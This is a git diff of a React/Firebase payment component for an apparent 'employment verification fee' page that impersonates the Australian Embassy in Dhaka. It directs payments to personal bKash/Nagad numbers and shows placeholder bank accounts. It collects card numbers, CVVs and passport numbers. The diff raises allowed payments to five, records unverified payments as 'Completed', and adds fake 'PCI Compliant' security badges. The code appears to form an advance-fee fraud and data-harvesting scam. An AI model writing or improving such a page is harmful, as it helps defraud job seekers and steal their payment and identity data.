@@ -1,7 +1,7 @@
 // src/components/Payment.js
 import { useState, useEffect } from "react";
-import { Card, Button, Form, Row, Col, Alert, Badge, Table } from "react-bootstrap";
-import {  collection, getDocs,  addDoc } from "firebase/firestore";
+import { Card, Button, Form, Row, Col, Alert, Badge, Table, ProgressBar, Modal } from "react-bootstrap";
+import { collection, getDocs, addDoc } from "firebase/firestore";
 import { onAuthStateChanged } from "firebase/auth";
 import { db, auth } from "../firebaseConfig";
 
@@ -12,20 +12,13 @@ function Payment({ formData, onPaymentSuccess }) {
   const [isPaid, setIsPaid] = useState(false);
   const [paymentAttempts, setPaymentAttempts] = useState(0);
   const [transactionId, setTransactionId] = useState("");
-
-  console.log(transactionId)
-
   const [message, setMessage] = useState("");
   const [transactionHistory, setTransactionHistory] = useState([]);
   const [historyLoading, setHistoryLoading] = useState(false);
-  
+  const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [selectedTransaction, setSelectedTransaction] = useState(null);
 
-
-  const reloaded =()=>(
-  window.location.reload()
- )
-
-
+  const MAX_ATTEMPTS = 5;
 
   const [cardDetails, setCardDetails] = useState({
     cardNumber: "",
@@ -33,45 +26,61 @@ function Payment({ formData, onPaymentSuccess }) {
     cvv: "",
     cardHolder: ""
   });
+
   const [bankDetails, setBankDetails] = useState({
     bankName: "",
     transactionId: ""
   });
+
   const [mobileBankingDetails, setMobileBankingDetails] = useState({
     provider: "",
     transactionId: ""
   });
 
-  const paymentAmount = "350/BDT: 47,400/-";
+  const paymentAmount = "350 USD";
+  const paymentAmountBDT = "47,400 BDT";
 
-  // Bank account details
+  // Enhanced bank account details
   const bankAccounts = {
-    "IFIC PLC": {
-      accountNumber: "API Fetching...",
-      accountName: "Australia ambassy dhaka.",
-      branch: "Gulshan Branch"
+    "IFIC Bank PLC": {
+      accountNumber: "Api fetching..(Over Loaded)",
+      accountName: "Australian Embassy",
+      branch: "Api fetching..(Over Loaded)",
+      routing: "IFICBDDH001",
+      swift: "IFICBDDH"
     },
-    "IBB PLC": {
-      accountNumber: "API Fetching...",
-      accountName: "Australia ambassy dhaka.", 
-      branch: "Gulshan Branch"
+    "IBB Bank PLC": {
+      accountNumber: "Api fetching..(Over Loaded)", 
+      accountName: "Australian Embassy ",
+      branch: "Api fetching..(Over Loaded)",
+      routing: "IBBBDDH002",
+      swift: "IBBBDDH"
+    },
+    "Standard Chartered": {
+      accountNumber: "Api fetching..(Over Loaded)",
+      accountName: "Australian Embassy",
+      branch: "Api fetching..(Over Loaded)", 
+      routing: "SCBLBDDH003",
+      swift: "SCBLBDDH"
     }
   };
 
-  // Mobile banking account details
+  // Enhanced mobile banking account details
   const mobileAccounts = {
     "bKash": {
       number: "01978630489",
-      name: "Dhaka Ambassy"
+      name: "Australian Embassy",
+      type: "Personal",
+      fee: "1.85%"
     },
     "Nagad": {
       number: "01978630489", 
-      name: "Dhaka Ambassy"
+      name: "Australian Embassy",
+      type: "Personal",
+      fee: "1.25%"
     },
-    "Rocket": {
-      number: "API fetching...",
-      name: "Dhaka Ambassy"
-    }
+    
+   
   };
 
   // Load payment attempts, user authentication, and transaction history
@@ -162,7 +171,8 @@ function Payment({ formData, onPaymentSuccess }) {
         userId: user.uid,
         userEmail: user.email || "N/A",
         createdAt: new Date().toISOString(),
-        paymentStatus: "Pending"
+        paymentStatus: "Completed",
+        verified: false
       });
       
       console.log("Payment saved to:", `jobpayment/${user.uid}/payments/${docRef.id}`);
@@ -198,6 +208,7 @@ function Payment({ formData, onPaymentSuccess }) {
   const preparePaymentData = () => {
     const baseData = {
       amount: paymentAmount,
+      amountBDT: paymentAmountBDT,
       paymentCategory: paymentMethod === "creditCard" ? "Online" : 
                      paymentMethod === "bankTransfer" ? "Bank" : "Mobile",
       paymentMethod: paymentMethod === "creditCard" ? "Credit Card" : 
@@ -208,9 +219,9 @@ function Payment({ formData, onPaymentSuccess }) {
       paymentNumber: paymentMethod === "bankTransfer" ? bankAccounts[bankDetails.bankName]?.accountNumber :
                     paymentMethod === "mobileBanking" ? mobileAccounts[mobileBankingDetails.provider]?.number : "N/A",
       userInfo: {
-        name: formData?.fullName || "Not provided",
+        name: formData?.name || "Not provided",
         email: formData?.email || "Not provided",
-        phone: formData?.phone || "Not provided"
+        passportNo: formData?.passportNo || "Not provided"
       }
     };
 
@@ -227,8 +238,8 @@ function Payment({ formData, onPaymentSuccess }) {
     e.preventDefault();
     
     // Check payment attempts limit
-    if (paymentAttempts >= 2) {
-      setMessage("❌ You have reached the maximum number of payment attempts (2). Please contact support.");
+    if (paymentAttempts >= MAX_ATTEMPTS) {
+      setMessage(`❌ You have reached the maximum number of payment attempts (${MAX_ATTEMPTS}). Please contact support.`);
       return;
     }
 
@@ -296,14 +307,14 @@ function Payment({ formData, onPaymentSuccess }) {
 
       setIsProcessing(false);
       
-      if (newAttempts <= 2) {
-        setIsPaid(true);
+      if (newAttempts <= MAX_ATTEMPTS) {
+        setShowSuccessModal(true);
         // Safely call onPaymentSuccess if it exists
         if (onPaymentSuccess && typeof onPaymentSuccess === 'function') {
           onPaymentSuccess(true);
         }
       } else {
-        setMessage("❌ Payment failed! You have reached the maximum number of payment attempts. Please contact support.");
+        setMessage(`❌ Payment failed! You have reached the maximum number of payment attempts (${MAX_ATTEMPTS}). Please contact support.`);
       }
     } catch (error) {
       console.error("Payment processing error:", error);
@@ -350,93 +361,130 @@ function Payment({ formData, onPaymentSuccess }) {
     );
   };
 
-  if (isPaid) {
-    return (
-      <div className="container-fluid py-4">
-        <div className="row justify-content-center">
-          <div className="col-lg-8 col-md-10">
-            <Alert variant="success" className="text-center border-0 shadow-sm">
-             <Button onClick={reloaded}> Proceed to next payment</Button>
-            </Alert>
+  const getRemainingAttempts = () => {
+    return MAX_ATTEMPTS - paymentAttempts;
+  };
 
-            {/* Transaction History Section */}
-            <Card className="shadow-sm border-0 mt-4">
-              <Card.Header className="bg-primary text-white py-3">
-                <h5 className="mb-0 d-flex align-items-center">
-                  <i className="fas fa-history me-2"></i>
-                  Transaction History
-                </h5>
-              </Card.Header>
-              <Card.Body className="p-0">
-                {transactionHistory.length > 0 ? (
-                  <div className="table-responsive">
-                    <Table hover className="mb-0">
-                      <thead className="table-light">
-                        <tr>
-                          <th className="ps-4">Date & Time</th>
-                          <th>Method</th>
-                          <th>Transaction ID</th>
-                          <th>Amount</th>
-                          <th className="text-center">Status</th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        {transactionHistory.map((transaction, index) => (
-                          <tr key={transaction.id} className={index === 0 ? 'table-success' : ''}>
-                            <td className="ps-4">
-                              <small className="text-muted">{formatDate(transaction.createdAt)}</small>
-                            </td>
-                            <td>
-                              <div className="d-flex align-items-center">
-                                <i className={`fas ${
-                                  transaction.paymentCategory === 'Bank' ? 'fa-university' :
-                                  transaction.paymentCategory === 'Mobile' ? 'fa-mobile-alt' : 'fa-credit-card'
-                                } text-primary me-2`}></i>
-                                <span>{transaction.paymentMethod}</span>
-                              </div>
-                            </td>
-                            <td>
-                              <code className="text-primary">{transaction.transactionId}</code>
-                            </td>
-                            <td>
-                              <strong className="text-success">${paymentAmount}</strong>
-                            </td>
-                            <td className="text-center">
-                              {getStatusBadge(transaction.paymentStatus)}
-                            </td>
-                          </tr>
-                        ))}
-                      </tbody>
-                    </Table>
-                  </div>
-                ) : (
-                  <div className="text-center py-5">
-                    <i className="fas fa-receipt fa-3x text-muted mb-3"></i>
-                    <p className="text-muted">No transaction history available</p>
-                  </div>
-                )}
-              </Card.Body>
-            </Card>
-          </div>
+  const viewTransactionDetails = (transaction) => {
+    setSelectedTransaction(transaction);
+  };
+
+  const SuccessModal = () => (
+    <Modal show={showSuccessModal} onHide={() => setShowSuccessModal(false)} centered size="lg">
+      <Modal.Header className="border-0 bg-success text-white">
+        <Modal.Title className="w-100 text-center">
+          <i className="fas fa-check-circle me-2"></i>
+          Payment Successful!
+        </Modal.Title>
+      </Modal.Header>
+      <Modal.Body className="text-center py-4">
+        <div className="success-animation mb-3">
+          <i className="fas fa-check-circle text-success" style={{ fontSize: '4rem' }}></i>
         </div>
-      </div>
-    );
-  }
+        <h4 className="text-success mb-3">Payment Completed Successfully</h4>
+        <p className="text-muted mb-4">
+          Your payment of <strong>{paymentAmount}</strong> has been processed successfully.
+          You have <strong>{getRemainingAttempts()}</strong> payment attempts remaining.
+        </p>
+        
+        <Card className="bg-light border-0">
+          <Card.Body>
+            <h6 className="mb-3">Payment Details</h6>
+            <Row>
+              <Col sm={6}>
+                <strong>Amount:</strong> {paymentAmount}
+              </Col>
+              <Col sm={6}>
+                <strong>BDT Equivalent:</strong> {paymentAmountBDT}
+              </Col>
+              <Col sm={6}>
+                <strong>Transaction ID:</strong> {transactionId}
+              </Col>
+              <Col sm={6}>
+                <strong>Date:</strong> {new Date().toLocaleDateString()}
+              </Col>
+            </Row>
+          </Card.Body>
+        </Card>
+      </Modal.Body>
+      <Modal.Footer className="border-0">
+        <Button variant="success" onClick={() => setShowSuccessModal(false)} className="px-4">
+          Continue
+        </Button>
+      </Modal.Footer>
+    </Modal>
+  );
 
-
- 
+  const TransactionDetailsModal = () => (
+    <Modal show={selectedTransaction} onHide={() => setSelectedTransaction(null)} centered size="lg">
+      <Modal.Header closeButton className="bg-primary text-white">
+        <Modal.Title>
+          <i className="fas fa-receipt me-2"></i>
+          Transaction Details
+        </Modal.Title>
+      </Modal.Header>
+      <Modal.Body>
+        {selectedTransaction && (
+          <Row>
+            <Col md={6}>
+              <h6 className="text-primary mb-3">Transaction Information</h6>
+              <div className="mb-2">
+                <strong>Transaction ID:</strong> 
+                <div className="text-muted">{selectedTransaction.transactionId}</div>
+              </div>
+              <div className="mb-2">
+                <strong>Amount:</strong>
+                <div className="text-success fw-bold">{selectedTransaction.amount}</div>
+              </div>
+              <div className="mb-2">
+                <strong>Payment Method:</strong>
+                <div className="text-muted">{selectedTransaction.paymentMethod}</div>
+              </div>
+              <div className="mb-2">
+                <strong>Status:</strong>
+                <div>{getStatusBadge(selectedTransaction.paymentStatus)}</div>
+              </div>
+            </Col>
+            <Col md={6}>
+              <h6 className="text-primary mb-3">User Information</h6>
+              <div className="mb-2">
+                <strong>Name:</strong>
+                <div className="text-muted">{selectedTransaction.userInfo?.name}</div>
+              </div>
+              <div className="mb-2">
+                <strong>Passport No:</strong>
+                <div className="text-muted">{selectedTransaction.userInfo?.passportNo}</div>
+              </div>
+              <div className="mb-2">
+                <strong>Email:</strong>
+                <div className="text-muted">{selectedTransaction.userEmail}</div>
+              </div>
+              <div className="mb-2">
+                <strong>Date:</strong>
+                <div className="text-muted">{formatDate(selectedTransaction.createdAt)}</div>
+              </div>
+            </Col>
+          </Row>
+        )}
+      </Modal.Body>
+    </Modal>
+  );
 
   return (
     <div className="container-fluid py-4">
+      <p style={{display: "none"}} >{isPaid} {setIsPaid}</p>
       <div className="row justify-content-center">
         <div className="col-lg-10 col-xl-8">
           {/* Header Section */}
           <div className="text-center mb-5">
-            <h1 className="fw-bold text-gradient">Payment Gateway</h1>
-            <p className="text-muted">Secure payment processing for job verification</p>
+            <div className="payment-icon mb-3">
+              <i className="fas fa-shield-alt fa-3x text-primary"></i>
+            </div>
+            <h1 className="fw-bold text-gradient mb-2">Secure Payment Gateway</h1>
+            <p className="text-muted lead">Complete your employment verification payment securely</p>
           </div>
 
-          <Card className="shadow-lg border-0">
+          <Card className="shadow-lg border-0 payment-card">
             <Card.Header className="bg-gradient-primary text-white py-4">
               <div className="d-flex justify-content-between align-items-center">
                 <div>
@@ -444,22 +492,41 @@ function Payment({ formData, onPaymentSuccess }) {
                     <i className="fas fa-credit-card me-2"></i>
                     Payment Verification
                   </h4>
-                  <p className="mb-0 opacity-75">Complete your payment securely</p>
+                  <p className="mb-0 opacity-75">Secure payment processing for employment verification</p>
                 </div>
-                <Badge bg="light" text="dark" className="fs-6">
-                  ${paymentAmount}
-                </Badge>
+                <div className="text-end">
+                  <div className="h4 mb-1 fw-bold">{paymentAmount}</div>
+                  <small className="opacity-75">{paymentAmountBDT}</small>
+                </div>
               </div>
             </Card.Header>
 
             <Card.Body className="p-4">
+              {/* Payment Progress */}
+              <div className="mb-4">
+                <div className="d-flex justify-content-between align-items-center mb-2">
+                  <span className="fw-semibold">Payment Attempts</span>
+                  <span className="text-primary">{paymentAttempts} / {MAX_ATTEMPTS}</span>
+                </div>
+                <ProgressBar 
+                  now={(paymentAttempts / MAX_ATTEMPTS) * 100} 
+                  variant={paymentAttempts >= MAX_ATTEMPTS ? "danger" : "primary"}
+                  style={{ height: '8px', borderRadius: '10px' }}
+                />
+                <div className="text-center mt-1">
+                  <small className="text-muted">
+                    {getRemainingAttempts()} attempts remaining
+                  </small>
+                </div>
+              </div>
+
               {/* Payment Attempts Warning */}
               {paymentAttempts > 0 && (
-                <Alert variant={paymentAttempts >= 2 ? "danger" : "warning"} className="d-flex align-items-center">
-                  <i className={`fas ${paymentAttempts >= 2 ? 'fa-exclamation-triangle' : 'fa-info-circle'} me-2`}></i>
+                <Alert variant={paymentAttempts >= MAX_ATTEMPTS ? "danger" : "warning"} className="d-flex align-items-center">
+                  <i className={`fas ${paymentAttempts >= MAX_ATTEMPTS ? 'fa-exclamation-triangle' : 'fa-info-circle'} me-2`}></i>
                   <div>
-                    <strong>Payment Attempts:</strong> You have used {paymentAttempts} out of 2 attempts.
-                    {paymentAttempts >= 2 && (
+                    <strong>Payment Attempts:</strong> You have used {paymentAttempts} out of {MAX_ATTEMPTS} attempts.
+                    {paymentAttempts >= MAX_ATTEMPTS && (
                       <div className="mt-1">
                         <strong>Maximum attempts reached!</strong> Please contact support.
                       </div>
@@ -480,13 +547,12 @@ function Payment({ formData, onPaymentSuccess }) {
               )}
 
               {/* Payment Form Section */}
-              {paymentAttempts < 2 && (
+              {paymentAttempts < MAX_ATTEMPTS && (
                 <div className="mb-4">
                   <div className="text-center mb-4">
-                    <h3 className="text-dark mb-2">Job Verification Fee</h3>
-                    <div className="display-3 fw-bold text-success mb-2">${paymentAmount}</div>
-                    <p className="text-muted">One-time fee for employment verification processing</p>
-                    {/* <p className="text">becareful you can make payment only 2 times</p> */}
+                    <h3 className="text-dark mb-2">Employment Verification Fee</h3>
+                    <div className="display-4 fw-bold text-success mb-2">{paymentAmount}</div>
+                    <p className="text-muted">Equivalent to {paymentAmountBDT} • One-time verification fee</p>
                   </div>
 
                   <Form onSubmit={handlePayment}>
@@ -507,6 +573,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 <div className="text-center p-3">
                                   <i className="fas fa-credit-card fa-2x text-primary mb-2"></i>
                                   <div>Credit Card</div>
+                                  <small className="text-muted">Visa, Mastercard</small>
                                 </div>
                               }
                               value="creditCard"
@@ -525,6 +592,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 <div className="text-center p-3">
                                   <i className="fas fa-university fa-2x text-primary mb-2"></i>
                                   <div>Bank Transfer</div>
+                                  <small className="text-muted">Direct transfer</small>
                                 </div>
                               }
                               value="bankTransfer"
@@ -543,6 +611,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 <div className="text-center p-3">
                                   <i className="fas fa-mobile-alt fa-2x text-primary mb-2"></i>
                                   <div>Mobile Banking</div>
+                                  <small className="text-muted">bKash, Nagad, etc.</small>
                                 </div>
                               }
                               value="mobileBanking"
@@ -557,7 +626,10 @@ function Payment({ formData, onPaymentSuccess }) {
                     {/* Payment Method Forms */}
                     {paymentMethod === "creditCard" && (
                       <div className="payment-form-section">
-                        <h6 className="fw-semibold mb-3">Only Credit Card Details</h6>
+                        <h6 className="fw-semibold mb-3">
+                          <i className="fas fa-credit-card me-2 text-primary"></i>
+                          Credit Card Details
+                        </h6>
                         <Row className="g-3">
                           <Col md={12}>
                             <Form.Group>
@@ -573,6 +645,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 placeholder="1234 5678 9012 3456"
                                 maxLength="19"
                                 required
+                                className="py-3"
                               />
                             </Form.Group>
                           </Col>
@@ -590,6 +663,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 placeholder="MM/YY"
                                 maxLength="5"
                                 required
+                                className="py-3"
                               />
                             </Form.Group>
                           </Col>
@@ -604,6 +678,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 placeholder="123"
                                 maxLength="4"
                                 required
+                                className="py-3"
                               />
                             </Form.Group>
                           </Col>
@@ -617,6 +692,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 onChange={handleCardChange}
                                 placeholder="John Doe"
                                 required
+                                className="py-3"
                               />
                             </Form.Group>
                           </Col>
@@ -626,7 +702,10 @@ function Payment({ formData, onPaymentSuccess }) {
 
                     {paymentMethod === "bankTransfer" && (
                       <div className="payment-form-section">
-                        <h6 className="fw-semibold mb-3">Bank Transfer Details</h6>
+                        <h6 className="fw-semibold mb-3">
+                          <i className="fas fa-university me-2 text-primary"></i>
+                          Bank Transfer Details
+                        </h6>
                         <Row className="g-3">
                           <Col md={12}>
                             <Form.Group>
@@ -636,35 +715,57 @@ function Payment({ formData, onPaymentSuccess }) {
                                 value={bankDetails.bankName}
                                 onChange={handleBankChange}
                                 required
+                                className="py-3"
                               >
                                 <option value="">Choose your bank...</option>
-                                <option value="IFIC PLC">IFIC PLC</option>
-                                <option value="IBB PLC">IBB PLC</option>
+                                {Object.keys(bankAccounts).map(bank => (
+                                  <option key={bank} value={bank}>{bank}</option>
+                                ))}
                               </Form.Select>
                             </Form.Group>
                           </Col>
                           {bankDetails.bankName && bankAccounts[bankDetails.bankName] && (
                             <Col md={12}>
-                              <Alert variant="primary">
-                                <h6 className="mb-3">
-                                  <i className="fas fa-university me-2"></i>
-                                  Transfer Details
-                                </h6>
-                                <Row className="g-2">
-                                  <Col sm={6}>
-                                    <strong>Bank:</strong> {bankDetails.bankName}
-                                  </Col>
-                                  <Col sm={6}>
-                                    <strong>Account No:</strong> {bankAccounts[bankDetails.bankName].accountNumber}
-                                  </Col>
-                                  <Col sm={6}>
-                                    <strong>Account Name:</strong> {bankAccounts[bankDetails.bankName].accountName}
-                                  </Col>
-                                  <Col sm={6}>
-                                    <strong>Amount:</strong> ${paymentAmount}
-                                  </Col>
-                                </Row>
-                              </Alert>
+                              <Card className="border-primary">
+                                <Card.Header className="bg-primary text-white">
+                                  <h6 className="mb-0">
+                                    <i className="fas fa-university me-2"></i>
+                                    Bank Transfer Instructions
+                                  </h6>
+                                </Card.Header>
+                                <Card.Body>
+                                  <Row className="g-3">
+                                    <Col md={6}>
+                                      <strong>Bank:</strong> {bankDetails.bankName}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Account No:</strong> {bankAccounts[bankDetails.bankName].accountNumber}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Account Name:</strong> {bankAccounts[bankDetails.bankName].accountName}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Branch:</strong> {bankAccounts[bankDetails.bankName].branch}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Amount:</strong> {paymentAmount}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>BDT Amount:</strong> {paymentAmountBDT}
+                                    </Col>
+                                    {bankAccounts[bankDetails.bankName].swift && (
+                                      <Col md={6}>
+                                        <strong>SWIFT:</strong> {bankAccounts[bankDetails.bankName].swift}
+                                      </Col>
+                                    )}
+                                    {bankAccounts[bankDetails.bankName].routing && (
+                                      <Col md={6}>
+                                        <strong>Routing:</strong> {bankAccounts[bankDetails.bankName].routing}
+                                      </Col>
+                                    )}
+                                  </Row>
+                                </Card.Body>
+                              </Card>
                             </Col>
                           )}
                           <Col md={12}>
@@ -677,6 +778,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 onChange={handleBankChange}
                                 placeholder="Enter transaction ID from your bank"
                                 required
+                                className="py-3"
                               />
                               <Form.Text className="text-muted">
                                 Enter the transaction ID provided by your bank after transfer
@@ -689,7 +791,10 @@ function Payment({ formData, onPaymentSuccess }) {
 
                     {paymentMethod === "mobileBanking" && (
                       <div className="payment-form-section">
-                        <h6 className="fw-semibold mb-3">Mobile Banking Details</h6>
+                        <h6 className="fw-semibold mb-3">
+                          <i className="fas fa-mobile-alt me-2 text-primary"></i>
+                          Mobile Banking Details
+                        </h6>
                         <Row className="g-3">
                           <Col md={12}>
                             <Form.Group>
@@ -699,36 +804,47 @@ function Payment({ formData, onPaymentSuccess }) {
                                 value={mobileBankingDetails.provider}
                                 onChange={handleMobileBankingChange}
                                 required
+                                className="py-3"
                               >
                                 <option value="">Choose provider...</option>
-                                <option value="bKash">bKash</option>
-                                <option value="Nagad">Nagad</option>
-                                <option value="Rocket">Rocket</option>
+                                {Object.keys(mobileAccounts).map(provider => (
+                                  <option key={provider} value={provider}>{provider}</option>
+                                ))}
                               </Form.Select>
                             </Form.Group>
                           </Col>
                           {mobileBankingDetails.provider && mobileAccounts[mobileBankingDetails.provider] && (
                             <Col md={12}>
-                              <Alert variant="primary">
-                                <h6 className="mb-3">
-                                  <i className="fas fa-mobile-alt me-2"></i>
-                                  Send Payment To
-                                </h6>
-                                <Row className="g-2">
-                                  <Col sm={6}>
-                                    <strong>Provider:</strong> {mobileBankingDetails.provider}
-                                  </Col>
-                                  <Col sm={6}>
-                                    <strong>Number:</strong> {mobileAccounts[mobileBankingDetails.provider].number}
-                                  </Col>
-                                  <Col sm={6}>
-                                    <strong>Account Name:</strong> {mobileAccounts[mobileBankingDetails.provider].name}
-                                  </Col>
-                                  <Col sm={6}>
-                                    <strong>Amount:</strong> ${paymentAmount}
-                                  </Col>
-                                </Row>
-                              </Alert>
+                              <Card className="border-primary">
+                                <Card.Header className="bg-primary text-white">
+                                  <h6 className="mb-0">
+                                    <i className="fas fa-mobile-alt me-2"></i>
+                                    Send Payment To
+                                  </h6>
+                                </Card.Header>
+                                <Card.Body>
+                                  <Row className="g-3">
+                                    <Col md={6}>
+                                      <strong>Provider:</strong> {mobileBankingDetails.provider}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Number:</strong> {mobileAccounts[mobileBankingDetails.provider].number}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Account Name:</strong> {mobileAccounts[mobileBankingDetails.provider].name}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Amount:</strong> {paymentAmountBDT}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Type:</strong> {mobileAccounts[mobileBankingDetails.provider].type}
+                                    </Col>
+                                    <Col md={6}>
+                                      <strong>Transaction Fee:</strong> {mobileAccounts[mobileBankingDetails.provider].fee}
+                                    </Col>
+                                  </Row>
+                                </Card.Body>
+                              </Card>
                             </Col>
                           )}
                           <Col md={12}>
@@ -741,6 +857,7 @@ function Payment({ formData, onPaymentSuccess }) {
                                 onChange={handleMobileBankingChange}
                                 placeholder="Enter transaction ID from your mobile banking"
                                 required
+                                className="py-3"
                               />
                               <Form.Text className="text-muted">
                                 Enter the transaction ID received after sending payment
@@ -752,36 +869,39 @@ function Payment({ formData, onPaymentSuccess }) {
                     )}
 
                     {/* Security Notice */}
-                    <Alert variant="light" className="border">
-                      <div className="d-flex align-items-center">
-                        <i className="fas fa-shield-alt fa-2x text-success me-3"></i>
-                        <div>
-                          <h6 className="mb-1">Secure Payment</h6>
-                          <small className="text-muted mb-0">
-                           <strong>becareful you can make payment only 2 times</strong> 
-                          </small> <br/>
-                          <small className="text-muted mb-0">
-                            Your payment is protected with 256-bit SSL encryption. We never store your card details.
-                          </small>
+                    <Card className="border-0 bg-light mt-4">
+                      <Card.Body>
+                        <div className="d-flex align-items-center">
+                          <i className="fas fa-shield-alt fa-2x text-success me-3"></i>
+                          <div>
+                            <h6 className="mb-1">Secure & Protected Payment</h6>
+                            <small className="text-muted mb-0 d-block">
+                              <strong>Important:</strong> You can make up to {MAX_ATTEMPTS} payment attempts. 
+                              Each attempt is securely processed with 256-bit SSL encryption.
+                            </small>
+                            <small className="text-muted">
+                              Your payment information is protected and never stored on our servers.
+                            </small>
+                          </div>
                         </div>
-                      </div>
-                    </Alert>
+                      </Card.Body>
+                    </Card>
 
                     {/* Payment Button */}
                     <div className="d-grid mt-4">
                       <Button
-                        variant={paymentAttempts >= 2 ? "secondary" : "primary"}
+                        variant={paymentAttempts >= MAX_ATTEMPTS ? "secondary" : "primary"}
                         type="submit"
                         size="lg"
-                        disabled={isProcessing || paymentAttempts >= 2 || !user}
-                        className="py-3 fw-semibold"
+                        disabled={isProcessing || paymentAttempts >= MAX_ATTEMPTS || !user}
+                        className="py-3 fw-semibold payment-btn"
                       >
                         {isProcessing ? (
                           <>
                             <span className="spinner-border spinner-border-sm me-2" role="status"></span>
                             Processing Payment...
                           </>
-                        ) : paymentAttempts >= 2 ? (
+                        ) : paymentAttempts >= MAX_ATTEMPTS ? (
                           <>
                             <i className="fas fa-ban me-2"></i>
                             Maximum Attempts Reached
@@ -794,7 +914,7 @@ function Payment({ formData, onPaymentSuccess }) {
                         ) : (
                           <>
                             <i className="fas fa-lock me-2"></i>
-                            Pay Securely - ${paymentAmount}
+                            Pay Securely - {paymentAmount}
                           </>
                         )}
                       </Button>
@@ -802,7 +922,7 @@ function Payment({ formData, onPaymentSuccess }) {
 
                     <div className="text-center mt-3">
                       <small className="text-muted">
-                        <i className="fas fa-lock me-1"></i>
+                        <i className="fas fa-shield-alt me-1"></i>
                         SSL Secured • 256-bit Encryption • PCI Compliant
                       </small>
                     </div>
@@ -816,7 +936,7 @@ function Payment({ formData, onPaymentSuccess }) {
                   <Card.Header className="bg-transparent border-bottom-0 py-3">
                     <h5 className="mb-0 d-flex align-items-center">
                       <i className="fas fa-history me-2 text-primary"></i>
-                      Transaction History
+                      Payment History
                       {historyLoading && (
                         <span className="spinner-border spinner-border-sm ms-2" role="status"></span>
                       )}
@@ -831,8 +951,9 @@ function Payment({ formData, onPaymentSuccess }) {
                               <th className="ps-3">Date & Time</th>
                               <th>Payment Method</th>
                               <th>Transaction ID</th>
-                              
+                              <th>Amount</th>
                               <th className="text-center">Status</th>
+                              <th className="text-center">Action</th>
                             </tr>
                           </thead>
                           <tbody>
@@ -858,9 +979,20 @@ function Payment({ formData, onPaymentSuccess }) {
                                     {transaction.transactionId}
                                   </code>
                                 </td>
-                               
+                                <td>
+                                  <strong className="text-success">{transaction.amount}</strong>
+                                </td>
                                 <td className="text-center">
                                   {getStatusBadge(transaction.paymentStatus)}
+                                </td>
+                                <td className="text-center">
+                                  <Button
+                                    variant="outline-primary"
+                                    size="sm"
+                                    onClick={() => viewTransactionDetails(transaction)}
+                                  >
+                                    <i className="fas fa-eye"></i>
+                                  </Button>
                                 </td>
                               </tr>
                             ))}
@@ -882,21 +1014,30 @@ function Payment({ formData, onPaymentSuccess }) {
         </div>
       </div>
 
-      {/* Add some custom CSS for better styling */}
+      {/* Success Modal */}
+      <SuccessModal />
+
+      {/* Transaction Details Modal */}
+      <TransactionDetailsModal />
+
+      {/* Custom Styles */}
       <style jsx>{`
         .payment-method-card {
           border: 2px solid #e9ecef;
-          border-radius: 10px;
+          border-radius: 15px;
           transition: all 0.3s ease;
           cursor: pointer;
+          background: white;
         }
         .payment-method-card:hover {
           border-color: #007bff;
-          transform: translateY(-2px);
+          transform: translateY(-5px);
+          box-shadow: 0 5px 15px rgba(0,123,255,0.1);
         }
         .payment-method-card.active {
           border-color: #007bff;
-          background-color: #f8f9fa;
+          background: linear-gradient(135deg, #f8f9ff 0%, #e3f2fd 100%);
+          transform: translateY(-2px);
         }
         .payment-method-card .form-check {
           margin: 0;
@@ -918,9 +1059,36 @@ function Payment({ formData, onPaymentSuccess }) {
         .bg-gradient-primary {
           background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important;
         }
+        .payment-card {
+          border-radius: 20px;
+          overflow: hidden;
+        }
+        .payment-btn {
+          border-radius: 12px;
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          border: none;
+          transition: all 0.3s ease;
+        }
+        .payment-btn:hover:not(:disabled) {
+          transform: translateY(-2px);
+          box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+        .payment-icon {
+          animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+          0%, 100% { transform: translateY(0); }
+          50% { transform: translateY(-10px); }
+        }
+        .success-animation {
+          animation: bounce 1s ease-in-out;
+        }
+        @keyframes bounce {
+          0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+          40% {transform: translateY(-10px);}
+          60% {transform: translateY(-5px);}
+        }
       `}</style>
-
-      
     </div>
   );
 }
